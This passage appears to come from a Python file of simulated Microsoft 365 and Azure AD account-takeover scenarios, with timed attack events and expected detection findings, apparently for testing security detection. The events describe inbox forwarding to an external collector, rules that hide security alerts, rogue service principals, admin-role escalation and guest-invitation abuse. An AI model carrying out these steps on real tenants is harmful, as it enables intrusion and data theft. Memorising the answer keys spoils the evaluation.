        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: Acquisition Target Analysis — Board Review", "success": True, "description": "Read email containing acquisition analysis from CEO mailbox", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: SharePoint and file collection ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "SharePoint", "action": "browse_library", "resource_name": "Executive Reports", "success": True, "description": "Browsed executive reports library using MFA-bypassed session", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/sharepoint/Executive Reports/board_strategy_2026.pptx", "system": "sharepoint", "label": "confidential", "category": "executive", "description": "Downloaded board strategy document via weakened policy session", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/sharepoint/Executive Reports/M&A_Pipeline_Confidential.xlsx", "system": "sharepoint", "label": "restricted", "category": "executive", "description": "Downloaded M&A pipeline spreadsheet from executive SharePoint", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: Persistence — inbox forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_forward_ceo", "resource_name": "Auto-Forward CEO Inbox to External", "success": True, "description": "Inbox forwarding rule created on CEO mailbox to external address for ongoing monitoring", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 11: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 131072, "bytes_received": 524288, "description": "HTTPS session to M365 from foreign IP — MFA-free access exploiting weakened CA policy"}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.65,
    iocs=[],
    expected_findings=[
        "Admin login from foreign IP on Day 1",
        "Trusted location created with attacker IP range disguised as satellite office",
        "CA policy weakened to exclude trusted location from MFA requirement",
        "Login without MFA from foreign IP days later",
        "CEO mailbox accessed and searched for M&A keywords",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

MAILBOX_FORWARDING_RULE = AttackScenario(
    id="mailbox_forwarding_rule",
    tier="T1",
    name="Silent Mailbox Forwarding Rule",
    description="Attacker logs in from foreign IP, searches mailbox for high-value content, creates a silent email forwarding rule to exfiltrate all incoming email to an external address, and multiple forwarded emails are observed leaving the mailbox. Network traffic confirms sustained access from attacker IP.",
    attack_type="account_takeover",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Mailbox browsing/search before rule creation ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'invoice OR wire transfer OR payment OR confidential'", "success": True, "description": "Attacker searched mailbox for financial keywords before setting up forwarding", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Create forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(8, 5, 1, 30), data={"app": "Exchange Admin Center", "action": "create_rule", "resource_name": "Auto-Forward", "success": True, "description": "Forwarding rule created to collector@exfil-mail.com", "metadata": {"attack_phase": "collection", "is_attacker": True, "forwarding_rule_created": True}}, requires_success=True),

        # --- Phase 4: First forwarded email ---
        AttackEvent(event_type="email", delay=_delay(120, 60, 30, 480), data={"direction": "sent", "subject": "Fwd: Q4 Financial Results", "external": True, "metadata": {"attack_phase": "exfiltration", "auto_forwarded": True}}, requires_success=True),

        # --- Phase 5: Second forwarded email ---
        AttackEvent(event_type="email", delay=_delay(180, 90, 45, 600), data={"direction": "sent", "subject": "Fwd: Wire Transfer Instructions — Vendor Payment", "external": True, "metadata": {"attack_phase": "exfiltration", "auto_forwarded": True}}, requires_success=True),

        # --- Phase 6: Network indicator — sustained attacker session ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 65536, "bytes_received": 262144, "description": "Sustained HTTPS session to Exchange Online from foreign IP during forwarding rule setup"}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.75,
    iocs=["exfil-mail.com"],
    expected_findings=["Login from foreign IP", "Forwarding rule to external address", "Multiple auto-forwarded emails to non-corporate domain"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

INBOX_HIDING_RULES = AttackScenario(
    id="inbox_hiding_rules",
    tier="T1",
    name="Inbox Hiding Rules for Security Email Suppression",
    description="Attacker logs in, searches mailbox to understand notification patterns, creates two separate inbox rules (one suppressing security alerts, one hiding finance-related emails), and both rules trigger to suppress legitimate notifications.",
    attack_type="account_takeover",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Mailbox search to understand what to suppress ---
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'security alert OR unusual sign-in OR suspicious activity'", "success": True, "description": "Attacker searched mailbox to identify security notification patterns", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: First rule — suppress security alerts ---
        AttackEvent(event_type="app_event", delay=_delay(6, 4, 1, 20), data={"app": "Outlook Web Access", "action": "create_rule", "resource_name": "Clutter", "resource_id": "rule_security_suppress", "success": True, "description": "Inbox rule: when subject contains 'security alert' or 'unusual sign-in', move to Deleted Items", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Second rule — suppress finance/invoice keywords ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "create_rule", "resource_name": "Archive", "resource_id": "rule_finance_suppress", "success": True, "description": "Inbox rule: when subject contains 'invoice' or 'wire transfer' or 'payment confirmation', move to RSS Feeds", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Security rule triggers ---
        AttackEvent(event_type="app_event", delay=_delay(240, 120, 60, 720), data={"app": "Outlook Web Access", "action": "rule_triggered", "resource_name": "Clutter", "success": True, "description": "Security alert rule auto-deleted sign-in notification", "metadata": {"attack_phase": "defense_evasion", "rule_suppressed_alert": True}}, requires_success=True),

        # --- Phase 6: Finance rule triggers ---
        AttackEvent(event_type="app_event", delay=_delay(300, 150, 60, 900), data={"app": "Outlook Web Access", "action": "rule_triggered", "resource_name": "Archive", "success": True, "description": "Finance rule auto-moved invoice notification to hidden folder", "metadata": {"attack_phase": "defense_evasion", "rule_suppressed_alert": True}}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.8,
    iocs=[],
    expected_findings=["Login from foreign IP", "Inbox rule created to suppress security alerts", "Second inbox rule created to hide finance emails"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

SERVICE_PRINCIPAL_PERSISTENCE = AttackScenario(
    id="service_principal_persistence",
    tier="T3",
    name="Service Principal and App Secret Persistence",
    description="Attacker with compromised admin credentials performs multi-day service principal persistence campaign. Day 1: discovers existing app registrations and service principals to understand naming conventions and permission patterns, inspects audit logs, creates a new app registration mimicking existing automation tools with Mail.ReadWrite.All, Files.ReadWrite.All, and User.Read.All permissions, obtains admin consent, adds a client secret, and verifies the credential works. Day 2-3: returns via client_credentials flow from a different IP, reads multiple executive mailboxes, searches for sensitive content, browses SharePoint sites, downloads confidential files, accesses Teams conversations, and exfiltrates data in bulk.",
    attack_type="account_takeover",
    events=[
        # =====================================================================
        # DAY 1 — Initial access + reconnaissance + app registration + persistence
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Discovery — enumerate existing apps and service principals ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure App Registrations", "action": "list_applications", "resource_name": "All App Registrations", "success": True, "description": "Enumerated existing app registrations to understand naming conventions and permission patterns", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure App Registrations", "action": "get_application", "resource_name": "Corp-Automation-Prod", "success": True, "description": "Inspected existing automation app to mimic its permission model", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Azure Active Directory", "action": "list_service_principals", "resource_name": "Enterprise Applications", "success": True, "description": "Enumerated service principals to identify existing automation patterns and consent grants", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure AD Audit Logs", "action": "list_audit_logs", "resource_name": "App Registration Activity — Last 30 Days", "success": True, "description": "Reviewed audit logs for recent app registration activity to understand normal frequency", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Create app with specific permissions ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Azure App Registrations", "action": "app_register", "resource_name": "IT Automation Service", "success": True, "description": "New application registered with plausible automation service name", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure App Registrations", "action": "grant_permission", "resource_name": "IT Automation Service", "success": True, "description": "Application API permission granted: Mail.ReadWrite.All (application)", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Azure App Registrations", "action": "grant_permission", "resource_name": "IT Automation Service", "success": True, "description": "Application API permission granted: Files.ReadWrite.All (application)", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Azure App Registrations", "action": "grant_permission", "resource_name": "IT Automation Service", "success": True, "description": "Application API permission granted: User.Read.All (application)", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Admin consent and secret creation ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure App Registrations", "action": "admin_consent_grant", "resource_name": "IT Automation Service", "success": True, "description": "Admin consent granted for all requested application permissions", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True, "admin_consent": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure App Registrations", "action": "add_secret", "resource_name": "IT Automation Service", "success": True, "description": "Client secret added to app registration — 2 year expiry", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Verify credentials work ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft Graph API", "action": "get_token", "resource_name": "OAuth2 Token Endpoint — client_credentials", "success": True, "description": "Verified service principal credentials — successfully obtained access token via client_credentials flow", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2-3 — Return via service principal + data collection + exfil
        # =====================================================================

        # --- Phase 6: Multi-day waiting period — return with SP credentials ---
        AttackEvent(event_type="login", delay=_delay(2160, 720, 1080, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "service_principal", "known_device": False, "user_agent": "python-requests/2.31.0", "method": "client_credentials", "metadata": {"attack_phase": "persistent_access", "is_attacker": True, "return_session": True}}, requires_success=True),

        # --- Phase 7: Enumerate users to identify high-value mailboxes ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Microsoft Graph API", "action": "list_users", "resource_name": "All Users — Graph API /users", "success": True, "description": "Service principal enumerated all users via User.Read.All to identify executives", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: API access — multiple mailbox reads ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Microsoft Graph API", "action": "list_messages", "resource_name": "CEO Mailbox — Inbox", "success": True, "description": "Service principal read CEO mailbox via Graph API — Mail.ReadWrite.All", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Microsoft Graph API", "action": "search_mailbox", "resource_name": "CEO Mailbox Search: 'acquisition OR merger OR board'", "success": True, "description": "Searched CEO mailbox for M&A keywords via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Microsoft Graph API", "action": "list_messages", "resource_name": "CFO Mailbox — Inbox", "success": True, "description": "Service principal read CFO mailbox via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Microsoft Graph API", "action": "read_email", "resource_type": "email", "resource_name": "Re: FY2027 Budget Approval — Board Confidential", "success": True, "description": "Read confidential budget approval email from CFO mailbox", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: File access — SharePoint and OneDrive ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Microsoft Graph API", "action": "list_drive_items", "resource_name": "Executive SharePoint Site", "success": True, "description": "Service principal browsed executive SharePoint site via Graph API — Files.ReadWrite.All", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/sharepoint/Executive/board_presentation_Q4.pptx", "system": "sharepoint", "label": "confidential", "category": "executive", "description": "Downloaded executive board presentation via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/sharepoint/Executive/Compensation_Analysis_2027.xlsx", "system": "sharepoint", "label": "restricted", "category": "hr", "description": "Downloaded compensation analysis from executive SharePoint via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "IT Automation Service (SP)", "auth": "none", "bytes_sent": 8192, "bytes_received": 4194304, "description": "Graph API calls from foreign IP via service principal — mailbox and file access"}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.7,
    iocs=[],
    expected_findings=[
        "Admin login from foreign IP on Day 1",
        "New app registration with broad permissions (Mail.ReadWrite.All, Files.ReadWrite.All)",
        "Admin consent granted for application permissions",
        "Client secret added with 2-year expiry",
        "Service principal login via client_credentials days later from foreign IP",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

PRIVILEGED_ROLE_ASSIGNMENT = AttackScenario(
    id="privileged_role_assignment",
    tier="T2",
    name="Privileged Role Assignment to Compromised Account",
    description="Attacker with compromised admin credentials logs in from foreign IP, performs pre-escalation reconnaissance by listing available roles and checking current permissions, assigns Global Administrator role to the compromised account, then abuses elevated privileges to create a service principal for persistence, access sensitive resources, and modify security policies.",
    attack_type="account_takeover",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: Pre-escalation reconnaissance ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure Active Directory", "action": "list_directory_roles", "resource_name": "All Directory Roles", "success": True, "description": "Enumerated all available Azure AD directory roles", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure Active Directory", "action": "get_role_assignments", "resource_name": "Current User Role Assignments", "success": True, "description": "Checked current role assignments and permissions for compromised account", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Azure Active Directory", "action": "list_role_eligible", "resource_name": "PIM Eligible Roles", "success": True, "description": "Queried Privileged Identity Management for eligible role activations", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: Privilege escalation ---
        AttackEvent(event_type="app_event", delay=_delay(8, 5, 1, 25), data={"app": "Azure Active Directory", "action": "role_assign", "resource_name": "Global Administrator", "success": True, "description": "Global Administrator role assigned to compromised account", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: Post-escalation — create service principal ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure App Registrations", "action": "app_register", "resource_name": "Azure Monitor Integration", "success": True, "description": "Created app registration disguised as monitoring service using elevated privileges", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure App Registrations", "action": "add_secret", "resource_name": "Azure Monitor Integration", "success": True, "description": "Added client secret to newly created app registration", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        # --- Phase 5: Access sensitive resources ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft 365 Admin Center", "action": "access", "success": True, "description": "Admin portal accessed with Global Administrator role", "metadata": {"attack_phase": "objectives", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 20), data={"app": "Microsoft 365 Admin Center", "action": "enumerate", "resource_name": "All Users", "success": True, "description": "Enumerated all tenant users and their roles", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 6: Modify security policies ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Azure AD Security", "action": "policy_modify", "resource_name": "Audit Log Retention Policy", "success": True, "description": "Reduced audit log retention from 180 days to 30 days", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "policy_weakened": True}}, requires_success=True),
        # --- Phase 7: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 262144, "bytes_received": 1048576, "description": "Sustained HTTPS session to Azure AD management endpoints from foreign IP — role escalation and policy modification"}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.7,
    iocs=[],
    expected_findings=["Login from foreign IP", "Global Administrator role assigned to compromised account", "Service principal created with client secret for persistence", "Security policy weakened — audit log retention reduced"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

GUEST_USER_INVITATION_ABUSE = AttackScenario(
    id="guest_user_invitation_abuse",
    tier="T3",
    name="Guest User Invitation Abuse for Persistence",
    description="Attacker with compromised credentials performs multi-day guest abuse campaign. Day 1: performs comprehensive tenant reconnaissance — reviews guest policies, lists existing guests, inspects group memberships, and enumerates SharePoint sites to plan access. Invites attacker-controlled guest with plausible consulting identity and adds guest to project SharePoint site. Day 2: guest accepts invitation and logs in, browses multiple SharePoint libraries, downloads confidential documents, accesses OneDrive shared files. Compromised user escalates guest to security group. Guest accesses Teams channels, reads messages, downloads shared files, accesses mailbox-shared content, and exfiltrates data.",
    attack_type="account_takeover",
    events=[
        # =====================================================================
        # DAY 1 — Compromised user: reconnaissance + invite guest + pre-stage access
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Comprehensive tenant reconnaissance ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure Active Directory", "action": "get_authorization_policy", "resource_name": "External Collaboration Settings", "success": True, "description": "Reviewed guest invitation settings — checked who can invite guests and guest access restrictions", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure Active Directory", "action": "list_guest_users", "resource_name": "Existing Guest Users", "success": True, "description": "Listed existing guest users to understand naming patterns and typical external domains", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure Active Directory", "action": "list_groups", "resource_name": "Security Groups with External Members", "success": True, "description": "Listed security groups that already have external/guest members to identify safe escalation targets", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "SharePoint", "action": "list_sites", "resource_name": "All SharePoint Sites", "success": True, "description": "Enumerated SharePoint sites accessible to the compromised account to plan guest access", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Guest invitation ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Azure Active Directory", "action": "invite_user", "resource_name": "j.martinez@external-consulting-group.com", "success": True, "description": "Guest user invited with plausible external consulting identity", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Pre-stage guest access to SharePoint ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "SharePoint", "action": "add_external_user", "resource_name": "Project Alpha — Site Members", "success": True, "description": "Added guest to Project Alpha SharePoint site as member before invitation acceptance", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Guest accepts invitation + data collection
        # (overnight gap: invitation sits in guest's inbox)
        # =====================================================================

        # --- Phase 5: Monitor invitation and guest login ---
        AttackEvent(event_type="app_event", delay=_delay(1440, 480, 720, 2880), data={"app": "Azure Active Directory", "action": "get_invitation_status", "resource_name": "j.martinez@external-consulting-group.com", "success": True, "description": "Checked guest invitation redemption status — invitation accepted", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(30, 15, 5, 120), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "B2B Guest", "metadata": {"attack_phase": "persistent_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: SharePoint browsing and file collection ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "SharePoint", "action": "browse_library", "resource_name": "Shared Documents", "success": True, "description": "Guest browsed shared document libraries to identify accessible content", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 20), data={"action": "download", "path": "/sharepoint/Shared Documents/project_overview.docx", "system": "sharepoint", "description": "Guest downloaded project overview document", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "SharePoint", "action": "browse_library", "resource_name": "Project Alpha Documents", "success": True, "description": "Guest browsed Project Alpha SharePoint library using pre-staged access", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/sharepoint/Project Alpha/vendor_contracts_2026.pdf", "system": "sharepoint", "label": "confidential", "description": "Guest downloaded vendor contracts from Project Alpha library", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/sharepoint/Project Alpha/Technical_Architecture_v3.docx", "system": "sharepoint", "label": "internal", "category": "engineering", "description": "Guest downloaded technical architecture document", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: OneDrive access via shared links ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "OneDrive for Business", "action": "browse_folder", "usage": "read", "resource_name": "Shared With Me", "success": True, "description": "Guest browsed files shared across the organization via OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/onedrive/Shared/Product_Roadmap_2027.pptx", "system": "onedrive", "label": "internal", "category": "strategy", "description": "Guest downloaded product roadmap from shared OneDrive folder", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Compromised user escalates guest permissions ---
        AttackEvent(event_type="app_event", delay=_delay(15, 10, 3, 60), data={"app": "Azure Active Directory", "action": "permission_escalate", "resource_name": "j.martinez@external-consulting-group.com", "success": True, "description": "Guest permissions escalated — added to security group with broader access to engineering and finance resources", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: Teams channel access after escalation ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Microsoft Teams", "action": "list_channels", "resource_name": "Engineering Team", "success": True, "description": "Guest browsed Teams channels in Engineering team after permission escalation", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft Teams", "action": "read_messages", "resource_name": "Engineering Team — General", "success": True, "description": "Guest read channel messages — gathered product roadmap and sprint planning intelligence", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft Teams", "action": "download_file", "resource_name": "Engineering Team — Files Tab", "success": True, "description": "Guest downloaded shared files from Engineering Teams channel Files tab", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "j.martinez@external-consulting-group.com (Guest)", "auth": "none", "bytes_sent": 8192, "bytes_received": 52428800, "description": "Sustained HTTPS session from guest user — bulk file downloads from SharePoint, OneDrive, and Teams"}, requires_success=True),
    ],
    parameters=_IDENTITY_BASE_PARAMS,
    success_rate=0.65,
    iocs=["external-consulting-group.com"],
    expected_findings=[
        "Guest user invited with plausible external consulting identity",
        "Guest login from attacker IP",
        "Guest permissions escalated to security group with engineering and finance access",
        "Confidential documents downloaded across SharePoint, OneDrive, and Teams",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

FEDERATION_TRUST_MODIFICATION = AttackScenario(
    id="federation_trust_modification",
    tier="T3",
    name="Federation Trust and SAML Configuration Modification",
    description="Attacker with compromised Global Admin access performs Azure AD reconnaissance over multiple days, enumerating federation configuration, domains, and SAML certificates to understand the current IdP setup. Returns to stage trust modifications by adding a rogue signing certificate, modifying the token issuer URL, and adding a trusted domain. Days later, uses forged SAML assertions for persistent access to cross-tenant resources, mailboxes, SharePoint sites, and exfiltrates sensitive data.",
    attack_type="account_takeover",
    events=[
        # =====================================================================
        # DAY 1 — Initial access + Azure AD federation reconnaissance
        # =====================================================================

        # --- Phase 1: Initial access — Global Admin login ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Azure AD federation reconnaissance ---
        # Enumerate current federation configuration
